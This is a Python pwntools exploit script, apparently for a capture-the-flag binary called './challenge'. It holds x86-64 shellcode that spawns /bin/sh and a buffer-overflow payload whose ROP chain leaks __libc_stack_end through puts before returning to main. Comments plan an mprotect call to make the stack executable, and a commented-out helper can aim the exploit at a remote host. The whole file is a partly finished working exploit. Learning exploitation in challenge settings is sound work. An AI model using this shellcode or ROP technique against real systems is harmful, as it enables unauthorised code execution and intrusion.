from pwn import *
import sys

# Buffer size is not 16 on the server
ADDR_SIZE = 8
OFFSET = 8
SHELL_CODE = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
SHELL_CODE_LEN = len(SHELL_CODE)
# info(SHELL_CODE_LEN)
LOCAL_BUFF_SIZE = 8 + OFFSET


# GDB script
gdb_script = """
break 25
break 28
continue
"""

# `int mprotect(addr[.size],    size,            protection);`
# registers:      RDI ,         RSX,        ,     RDI

# PROT_READ = 4
# PROT_WRITE = 2
# PROT_EXEC = 1
# protection = 0x7

# dl_pagesize = (little endian): 0x00 10 00 00 00 00 00 00
#             = 0x 00 00 00 00 00 00 10 00
#             = 4096 bytes

# __libc_stack_end = 0x0049fa38
# puts = 0x0040a780

# 0x0000000000402081 : pop rdi ; ret

# Prepare program
exe = "./challenge"
context.binary = binary = ELF(exe, checksec=True)
context.log_level = "DEBUG"


rdi_ret = p64(0x0000000000402081, "little")
libc_stack_end = p64(binary.symbols.get("__libc_stack_end"))
main_addr = p64(binary.symbols.get("main"))
puts_addr = p64(binary.symbols.get("_IO_puts"))
payload = b"A" * LOCAL_BUFF_SIZE + rdi_ret + libc_stack_end + puts_addr + main_addr

# io = process()
io = gdb.debug([exe], gdbscript=gdb_script)
io.sendline(payload)
io.interactive()

# def start(argv=[], *a, **kwargs):
#     if args.GDB:
#         return gdb.debug([exe] + argv, gdbscript=gdb_script, *a, **kwargs)
#     elif args.REMOTE:
#         return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
#     else:
#         return process([exe] + argv, *a, **kwargs)


# io.recvuntil("Good luck.\n")
# fgetsAddr = io.recvline()
# io.recv()

# exit(1)
